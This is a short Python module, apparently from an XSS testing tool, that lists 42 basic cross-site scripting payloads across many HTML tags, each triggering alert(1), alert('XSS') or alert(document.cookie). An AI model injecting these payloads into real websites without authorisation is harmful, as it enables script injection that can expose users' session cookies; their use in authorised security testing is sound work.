"""
Basic XSS payloads
"""

BASIC_PAYLOADS = [
    # Basic alert payloads
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',

    # Basic HTML tag payloads
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=alert(document.cookie)>',

    # Basic SVG payloads
    '<svg onload=alert(1)>',
    '<svg onload=alert("XSS")>',
    '<svg onload=alert(document.cookie)>',

    # Basic body tag payloads
    '<body onload=alert(1)>',
    '<body onload=alert("XSS")>',
    '<body onload=alert(document.cookie)>',

    # Basic input tag payloads
    '<input autofocus onfocus=alert(1)>',
    '<input autofocus onfocus=alert("XSS")>',
    '<input autofocus onfocus=alert(document.cookie)>',

    # Basic iframe payloads
    '<iframe src="javascript:alert(1)"></iframe>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<iframe src="javascript:alert(document.cookie)"></iframe>',

    # Basic div tag payloads
    '<div onmouseover="alert(1)">Hover me</div>',
    '<div onmouseover="alert(\'XSS\')">Hover me</div>',
    '<div onmouseover="alert(document.cookie)">Hover me</div>',

    # Basic a tag payloads
    '<a href="javascript:alert(1)">Click me</a>',
    '<a href="javascript:alert(\'XSS\')">Click me</a>',
    '<a href="javascript:alert(document.cookie)">Click me</a>',

    # Basic button tag payloads
    '<button onclick="alert(1)">Click me</button>',
    '<button onclick="alert(\'XSS\')">Click me</button>',
    '<button onclick="alert(document.cookie)">Click me</button>',

    # Basic textarea tag payloads
    '<textarea onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert("XSS") autofocus>',
    '<textarea onfocus=alert(document.cookie) autofocus>',

    # Basic select tag payloads
    '<select onfocus=alert(1) autofocus>',
    '<select onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert(document.cookie) autofocus>',

    # Basic marquee tag payloads
    '<marquee onstart=alert(1)>',
    '<marquee onstart=alert("XSS")>',
    '<marquee onstart=alert(document.cookie)>',

    # Basic video tag payloads
    '<video src=x onerror=alert(1)>',
    '<video src=x onerror=alert("XSS")>',
    '<video src=x onerror=alert(document.cookie)>',

    # Basic audio tag payloads
    '<audio src=x onerror=alert(1)>',
    '<audio src=x onerror=alert("XSS")>',
    '<audio src=x onerror=alert(document.cookie)>',
]
